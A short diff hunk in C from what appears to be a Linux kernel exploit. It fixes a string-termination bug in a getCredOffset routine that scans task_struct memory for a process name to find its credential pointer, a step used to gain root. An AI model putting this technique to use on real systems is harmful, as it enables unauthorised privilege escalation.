@@ -627,7 +627,7 @@ int getCredOffset(unsigned char* task_struct_data, char* execName) {
         p++;
     unsigned n = MIN(strlen(p)+1, 16);
     memcpy(taskname, p, n);
-    p[15] = 0; 
+    taskname[15] = 0; 
     
     for (int i=OFFSET__task_struct__stack+8; i<PAGE-16; i+=8) 
         if (0 == memcmp(task_struct_data+i, p, n) && verifyCred(*(unsigned long*)(task_struct_data+i-8)))
